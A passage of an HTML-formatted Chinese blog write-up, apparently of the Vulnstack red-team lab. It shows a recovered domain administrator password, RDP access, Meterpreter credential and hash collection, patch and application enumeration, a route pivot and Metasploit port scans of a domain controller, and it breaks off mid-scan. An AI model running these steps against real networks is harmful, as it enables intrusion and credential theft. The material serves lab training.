class=\"hljs-number\"\u003e30\u003c/span\u003e cb 06 \u003cspan class=\"hljs-number\"\u003e36\u003c/span\u003e c9 \u003cspan class=\"hljs-number\"\u003e74\u003c/span\u003e fc \u003cspan class=\"hljs-number\"\u003e59\u003c/span\u003e 3e 4f \u003cspan class=\"hljs-number\"\u003e49\u003c/span\u003e 9a fc \u003cspan class=\"hljs-number\"\u003e20\u003c/span\u003e 0a c3 f1 01 af \u003cspan class=\"hljs-number\"\u003e69\u003c/span\u003e df \u003cspan class=\"hljs-number\"\u003e54\u003c/span\u003e f4 \u003cspan class=\"hljs-number\"\u003e70\u003c/span\u003e c0 fa 3e \u003cspan class=\"hljs-number\"\u003e13\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e95\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e11\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e93\u003c/span\u003e 9c \u003cspan class=\"hljs-number\"\u003e76\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e39\u003c/span\u003e 3c c1 ad f0 a3 4e \u003cspan class=\"hljs-number\"\u003e78\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e61\u003c/span\u003e b8 08 01 2d \u003cspan class=\"hljs-number\"\u003e42\u003c/span\u003e c0 \u003cspan class=\"hljs-number\"\u003e82\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e56\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e66\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e23\u003c/span\u003e\n                            2e d1 07 da fd \u003cspan class=\"hljs-number\"\u003e12\u003c/span\u003e b7 f6 \u003cspan class=\"hljs-number\"\u003e67\u003c/span\u003e 8d \u003cspan class=\"hljs-number\"\u003e40\u003c/span\u003e 4a d2 7f \u003cspan class=\"hljs-number\"\u003e47\u003c/span\u003e 7c a5 b3 e5 7c 5d a0 0b \u003cspan class=\"hljs-number\"\u003e77\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e45\u003c/span\u003e c1 \u003cspan class=\"hljs-number\"\u003e92\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e88\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e38\u003c/span\u003e de 6f \u003cspan class=\"hljs-number\"\u003e93\u003c/span\u003e da b4 d1 c1 ec \u003cspan class=\"hljs-number\"\u003e20\u003c/span\u003e da f7 \u003cspan class=\"hljs-number\"\u003e98\u003c/span\u003e ac a8 05 \u003cspan class=\"hljs-number\"\u003e30\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e71\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e85\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e68\u003c/span\u003e 0b \u003cspan class=\"hljs-number\"\u003e39\u003c/span\u003e de c4 \u003cspan class=\"hljs-number\"\u003e42\u003c/span\u003e db \u003cspan class=\"hljs-number\"\u003e21\u003c/span\u003e 4a \u003cspan class=\"hljs-number\"\u003e83\u003c/span\u003e ee ed ea\n                            9f \u003cspan class=\"hljs-number\"\u003e48\u003c/span\u003e e0 \u003cspan class=\"hljs-number\"\u003e59\u003c/span\u003e 1a \u003cspan class=\"hljs-number\"\u003e95\u003c/span\u003e f2 e7 c2 d7 \u003cspan class=\"hljs-number\"\u003e89\u003c/span\u003e 9e 06 ca 05 a0 4e \u003cspan class=\"hljs-number\"\u003e25\u003c/span\u003e a4 06 07 d4 cd \u003cspan class=\"hljs-number\"\u003e27\u003c/span\u003e db 8d b1 bd c0 \u003cspan class=\"hljs-number\"\u003e78\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e39\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e72\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e79\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e37\u003c/span\u003e a0 \u003cspan class=\"hljs-number\"\u003e75\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e98\u003c/span\u003e ab 8f 1a \u003cspan class=\"hljs-number\"\u003e11\u003c/span\u003e ce \u003cspan class=\"hljs-number\"\u003e56\u003c/span\u003e dd \u003cspan class=\"hljs-number\"\u003e90\u003c/span\u003e 06 \u003cspan class=\"hljs-number\"\u003e97\u003c/span\u003e 8e 01 df \u003cspan class=\"hljs-number\"\u003e52\u003c/span\u003e f4 bc 8c b3 ae c9 c2 \u003cspan class=\"hljs-number\"\u003e15\u003c/span\u003e bb\n                            \u003cspan class=\"hljs-number\"\u003e96\u003c/span\u003e fb \u003cspan class=\"hljs-number\"\u003e62\u003c/span\u003e df 7a \u003cspan class=\"hljs-number\"\u003e48\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e63\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e24\u003c/span\u003e dc fb 4c 3c 6d fd \u003cspan class=\"hljs-number\"\u003e35\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e18\u003c/span\u003e b0 \u003cspan class=\"hljs-number\"\u003e82\u003c/span\u003e 4a ec a5 ee d1 de \u003cspan class=\"hljs-number\"\u003e46\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e77\u003c/span\u003e 2d 07 \u003cspan class=\"hljs-number\"\u003e20\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e31\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e79\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e69\u003c/span\u003e d3 5c fa \u003cspan class=\"hljs-number\"\u003e62\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e46\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e62\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e50\u003c/span\u003e 3b 09 d0 d6 \u003cspan class=\"hljs-number\"\u003e94\u003c/span\u003e b9 d2 \u003cspan class=\"hljs-number\"\u003e99\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e58\u003c/span\u003e 4b a5 \u003cspan class=\"hljs-number\"\u003e21\u003c/span\u003e 5c 03 5b 01 fa \u003cspan class=\"hljs-number\"\u003e95\u003c/span\u003e ca \u003cspan class=\"hljs-number\"\u003e90\u003c/span\u003e 8d\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e得到密码\u003ccode\u003ehongrisec@2019\u003c/code\u003e ，也就是域管理员的密码\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch3\u003e连接靶机RDP\u003c/h3\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e账户\u003ccode\u003egod\\administrator\u003c/code\u003e ,密码使用\u003ccode\u003ehongrisec@2019\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA(%E4%B8%80)/image8.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e连接成功，那么我们就拿下了边缘主机\u003ccode\u003ewin7\u003c/code\u003e的远程桌面了\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e我们尝试下通过网络访问域控主机，假如\u003ccode\u003eadministrator\u003c/code\u003e是管理员账户就可以正常访问\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA(%E4%B8%80)/image9.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e果然鹤猜想的一样，可以正常访问\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch2\u003e内网渗透\u003c/h2\u003e\n\u003ch3\u003e继续内网信息收集，使用MSF的脚本\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e查看靶机是否是虚拟机，是否处于蜜罐中\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003emeterpreter \u003e run post/windows/gather/checkvm \n\n[*] Checking \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e the target \u003cspan class=\"hljs-keyword\"\u003eis\u003c/span\u003e a Virtual Machine ...\n[+] This \u003cspan class=\"hljs-keyword\"\u003eis\u003c/span\u003e a VMware Virtual Machine\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e因为我们现在是靶场环境，所以我们是出于虚拟机状态的\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e查用用户信息，将密码离散值也弄出来了。密码离散值通过\u003ccode\u003ehashdump\u003c/code\u003e也可以获取\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003emeterpreter \u003e run post/windows/gather/credentials/credential_collector \n\n[*] Running module against STU1\n[+] Collecting hashes...\n    Extracted: Administrator:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0\n    Extracted: Guest:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0\n    Extracted: liukaifeng01:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0\n[+] Collecting tokens...\n    GOD\\Administrator\n    NT AUTHORITY\\SYSTEM\n    No tokens available\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e查看补丁信息\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003emeterpreter \u003e run post/windows/gather/enum_patches \n[*] Running module against STU1 (\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.75\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.186\u003c/span\u003e)\nInstalled Patches\n=================\n  HotFix ID  Install Date\n  ---------  ------------\n  KB2534111  \u003cspan class=\"hljs-number\"\u003e8\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e25\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e2019\u003c/span\u003e\n  KB2999226  \u003cspan class=\"hljs-number\"\u003e9\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e15\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e2019\u003c/span\u003e\n  KB958488   \u003cspan class=\"hljs-number\"\u003e8\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e29\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e2019\u003c/span\u003e\n  KB976902   \u003cspan class=\"hljs-number\"\u003e11\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e21\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e2010\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e枚举靶机上安装的应用程序\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003emeterpreter \u003e run post/windows/gather/enum_applications \n[*] Enumerating applications installed on STU1\nInstalled Applications\n======================\n Name                                                            Version\n ----                                                            -------\n Microsoft Visual C++ \u003cspan class=\"hljs-number\"\u003e2008\u003c/span\u003e Redistributable - x86 \u003cspan class=\"hljs-number\"\u003e9.0\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.30729\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.4148\u003c/span\u003e  \u003cspan class=\"hljs-number\"\u003e9.0\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.30729\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.4148\u003c/span\u003e\n Microsoft Visual C++ \u003cspan class=\"hljs-number\"\u003e2008\u003c/span\u003e Redistributable - x86 \u003cspan class=\"hljs-number\"\u003e9.0\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.30729\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.4148\u003c/span\u003e  \u003cspan class=\"hljs-number\"\u003e9.0\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.30729\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.4148\u003c/span\u003e\n Microsoft Visual C++ \u003cspan class=\"hljs-number\"\u003e2008\u003c/span\u003e Redistributable - x86 \u003cspan class=\"hljs-number\"\u003e9.0\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.30729\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.6161\u003c/span\u003e  \u003cspan class=\"hljs-number\"\u003e9.0\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.30729\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.6161\u003c/span\u003e\n Microsoft Visual C++ \u003cspan class=\"hljs-number\"\u003e2008\u003c/span\u003e Redistributable - x86 \u003cspan class=\"hljs-number\"\u003e9.0\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.30729\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.6161\u003c/span\u003e  \u003cspan class=\"hljs-number\"\u003e9.0\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.30729\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.6161\u003c/span\u003e\n Microsoft Visual C++ \u003cspan class=\"hljs-number\"\u003e2013\u003c/span\u003e Redistributable (x86) - \u003cspan class=\"hljs-number\"\u003e12.0\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.21005\u003c/span\u003e    \u003cspan class=\"hljs-number\"\u003e12.0\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.21005\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.1\u003c/span\u003e\n Microsoft Visual C++ \u003cspan class=\"hljs-number\"\u003e2013\u003c/span\u003e Redistributable (x86) - \u003cspan class=\"hljs-number\"\u003e12.0\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.21005\u003c/span\u003e    \u003cspan class=\"hljs-number\"\u003e12.0\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.21005\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.1\u003c/span\u003e\n Microsoft Visual C++ \u003cspan class=\"hljs-number\"\u003e2013\u003c/span\u003e x86 Additional Runtime - \u003cspan class=\"hljs-number\"\u003e12.0\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.21005\u003c/span\u003e   \u003cspan class=\"hljs-number\"\u003e12.0\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.21005\u003c/span\u003e\n Microsoft Visual C++ \u003cspan class=\"hljs-number\"\u003e2013\u003c/span\u003e x86 Additional Runtime - \u003cspan class=\"hljs-number\"\u003e12.0\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.21005\u003c/span\u003e   \u003cspan class=\"hljs-number\"\u003e12.0\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.21005\u003c/span\u003e\n Microsoft Visual C++ \u003cspan class=\"hljs-number\"\u003e2013\u003c/span\u003e x86 Minimum Runtime - \u003cspan class=\"hljs-number\"\u003e12.0\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.21005\u003c/span\u003e      \u003cspan class=\"hljs-number\"\u003e12.0\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.21005\u003c/span\u003e\n Microsoft Visual C++ \u003cspan class=\"hljs-number\"\u003e2013\u003c/span\u003e x86 Minimum Runtime - \u003cspan class=\"hljs-number\"\u003e12.0\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.21005\u003c/span\u003e      \u003cspan class=\"hljs-number\"\u003e12.0\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.21005\u003c/span\u003e\n Microsoft Visual C++ \u003cspan class=\"hljs-number\"\u003e2017\u003c/span\u003e Redistributable (x86) - \u003cspan class=\"hljs-number\"\u003e14.16\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.27033\u003c/span\u003e   \u003cspan class=\"hljs-number\"\u003e14.16\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.27033\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.0\u003c/span\u003e\n Microsoft Visual C++ \u003cspan class=\"hljs-number\"\u003e2017\u003c/span\u003e Redistributable (x86) - \u003cspan class=\"hljs-number\"\u003e14.16\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.27033\u003c/span\u003e   \u003cspan class=\"hljs-number\"\u003e14.16\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.27033\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.0\u003c/span\u003e\n Microsoft Visual C++ \u003cspan class=\"hljs-number\"\u003e2017\u003c/span\u003e X86 Additional Runtime - \u003cspan class=\"hljs-number\"\u003e14.16\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.27033\u003c/span\u003e  \u003cspan class=\"hljs-number\"\u003e14.16\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.27033\u003c/span\u003e\n Microsoft Visual C++ \u003cspan class=\"hljs-number\"\u003e2017\u003c/span\u003e X86 Additional Runtime - \u003cspan class=\"hljs-number\"\u003e14.16\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.27033\u003c/span\u003e  \u003cspan class=\"hljs-number\"\u003e14.16\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.27033\u003c/span\u003e\n Microsoft Visual C++ \u003cspan class=\"hljs-number\"\u003e2017\u003c/span\u003e X86 Minimum Runtime - \u003cspan class=\"hljs-number\"\u003e14.16\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.27033\u003c/span\u003e     \u003cspan class=\"hljs-number\"\u003e14.16\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.27033\u003c/span\u003e\n Microsoft Visual C++ \u003cspan class=\"hljs-number\"\u003e2017\u003c/span\u003e X86 Minimum Runtime - \u003cspan class=\"hljs-number\"\u003e14.16\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.27033\u003c/span\u003e     \u003cspan class=\"hljs-number\"\u003e14.16\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.27033\u003c/span\u003e\n Mozilla Firefox \u003cspan class=\"hljs-number\"\u003e69.0\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.1\u003c/span\u003e (x86 zh-CN)                              \u003cspan class=\"hljs-number\"\u003e69.0\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.1\u003c/span\u003e\n Mozilla Firefox \u003cspan class=\"hljs-number\"\u003e69.0\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.1\u003c/span\u003e (x86 zh-CN)                              \u003cspan class=\"hljs-number\"\u003e69.0\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.1\u003c/span\u003e\n Nmap \u003cspan class=\"hljs-number\"\u003e7.80\u003c/span\u003e                                                       \u003cspan class=\"hljs-number\"\u003e7.80\u003c/span\u003e\n Nmap \u003cspan class=\"hljs-number\"\u003e7.80\u003c/span\u003e                                                       \u003cspan class=\"hljs-number\"\u003e7.80\u003c/span\u003e\n Notepad++ (\u003cspan class=\"hljs-number\"\u003e32\u003c/span\u003e-bit x86)                                          \u003cspan class=\"hljs-number\"\u003e7.7\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.1\u003c/span\u003e\n Notepad++ (\u003cspan class=\"hljs-number\"\u003e32\u003c/span\u003e-bit x86)                                          \u003cspan class=\"hljs-number\"\u003e7.7\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.1\u003c/span\u003e\n Npcap \u003cspan class=\"hljs-number\"\u003e0.9983\u003c/span\u003e                                                    \u003cspan class=\"hljs-number\"\u003e0.9983\u003c/span\u003e\n Npcap \u003cspan class=\"hljs-number\"\u003e0.9983\u003c/span\u003e                                                    \u003cspan class=\"hljs-number\"\u003e0.9983\u003c/span\u003e\n WinPcap \u003cspan class=\"hljs-number\"\u003e4.1\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.3\u003c/span\u003e                                                   \u003cspan class=\"hljs-number\"\u003e4.1\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.0\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.2980\u003c/span\u003e\n WinPcap \u003cspan class=\"hljs-number\"\u003e4.1\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.3\u003c/span\u003e                                                   \u003cspan class=\"hljs-number\"\u003e4.1\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.0\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.2980\u003c/span\u003e\n Wireshark \u003cspan class=\"hljs-number\"\u003e3.0\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.4\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e32\u003c/span\u003e-bit                                          \u003cspan class=\"hljs-number\"\u003e3.0\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.4\u003c/span\u003e\n Wireshark \u003cspan class=\"hljs-number\"\u003e3.0\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.4\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e32\u003c/span\u003e-bit                                          \u003cspan class=\"hljs-number\"\u003e3.0\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.4\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3\u003e内网端口扫描\u003c/h3\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e把\u003ccode\u003ewin7\u003c/code\u003e当跳板，则需要添加路由\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e\u003cspan class=\"hljs-comment\"\u003e#添加一条路由\u003c/span\u003e\nrun autoroute -s \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.52\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.0\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e24\u003c/span\u003e  \u003cspan class=\"hljs-comment\"\u003e# 在kali上添加一条通向内网的路由\u003c/span\u003e\n\u003cspan class=\"hljs-comment\"\u003e#查看路由添加情况\u003c/span\u003e\nrun autoroute -p\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e然后将当前会话放入后台，存为\u003ccode\u003esession 1\u003c/code\u003e ，后面可以通过\u003ccode\u003esessions\u003c/code\u003e命令指定\u003ccode\u003e1\u003c/code\u003e回到当前会话\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003emeterpreter \u003e background\n[*] Backgrounding session \u003cspan class=\"hljs-number\"\u003e1.\u003c/span\u003e.. \n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e使用辅助模块里边的端口扫描，来扫描域里边的两台主机\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e首先扫描域成员的端口\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003emsf6 exploit(multi/handler) \u003e use auxiliary/scanner/portscan/tcp \nmsf6 auxiliary(scanner/portscan/tcp) \u003e \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e rhosts \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.52\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.141\u003c/span\u003e\nmsf6 auxiliary(scanner/portscan/tcp) \u003e \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e ports \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e500\u003c/span\u003e,\u003cspan class=\"hljs-number\"\u003e3389\u003c/span\u003e,\u003cspan class=\"hljs-number\"\u003e3306\u003c/span\u003e\nmsf6 auxiliary(scanner/portscan/tcp) \u003e run\n[+] \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.52\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.141\u003c/span\u003e:       - \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.52\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.141\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e21\u003c/span\u003e - TCP OPEN\n[+] \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.52\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.141\u003c/span\u003e:       - \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.52\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.141\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e135\u003c/span\u003e - TCP OPEN\n[+] \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.52\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.141\u003c/span\u003e:       - \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.52\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.141\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e139\u003c/span\u003e - TCP OPEN\n[+] \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.52\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.141\u003c/span\u003e:       - \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.52\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.141\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e - TCP OPEN\n[*] \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.52\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.141\u003c/span\u003e:       - Scanned \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e of \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e hosts (\u003cspan class=\"hljs-number\"\u003e100\u003c/span\u003e% complete)\n[*] Auxiliary module execution completed\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e开启了\u003ccode\u003e21\u003c/code\u003e，\u003ccode\u003e135\u003c/code\u003e，\u003ccode\u003e139\u003c/code\u003e，\u003ccode\u003e445\u003c/code\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e扫描域控\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003emsf6 auxiliary(scanner/portscan/tcp) \u003e \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e rhosts \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.52\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.138\u003c/span\u003e\n[+] \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.52\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.138\u003c/span\u003e:       - \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.52\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.138\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e135\u003c/span\u003e - TCP OPEN\n[+] \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.52\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.138\u003c/span\u003e:       - \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.52\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.138\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e80\u003c/span\u003e - TCP OPEN\n[+] \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.52\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.138\u003c/span\u003e:       - \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.52\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.138\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e - TCP OPEN\n[+] \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.52\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.138\u003c/span\u003e:       - \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.52\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.138\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e139\u003c/span\u003e - TCP OPEN\n[*] \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.52\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.138\u003c/span\u003e:       - Scanned \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e of \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e hosts (\u003cspan class=\"hljs-number\"\u003e100\u003c/span\u003e% complete)\n[*] Auxiliary module execution completed\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e存在 